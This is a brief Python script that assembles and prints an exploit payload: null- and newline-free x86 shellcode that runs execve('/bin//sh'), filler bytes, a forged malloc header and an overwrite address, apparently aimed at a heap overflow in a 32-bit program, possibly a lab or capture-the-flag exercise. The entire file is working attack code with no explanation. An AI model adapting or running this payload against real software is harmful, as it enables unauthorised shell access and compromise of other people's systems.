# Shellcode without '\n' or '\0' that executes 'execve("/bin//sh", NULL, NULL)'
SHELLCODE = b"1\xc0P\x04\x0bh//shh/bin\x89\xe31\xc91\xd2\xcd\x80"

ASTR_FILLER = b"A" * (100 - len(SHELLCODE))

AVAL_FILLER = b"B" * 4

MALLOC_HEADER = b"\x0c\xa0\x04\x08"

BADD = b"\x74\xa0\x04\x08"

EXPLOIT = SHELLCODE + ASTR_FILLER + AVAL_FILLER + MALLOC_HEADER + BADD

print(EXPLOIT)
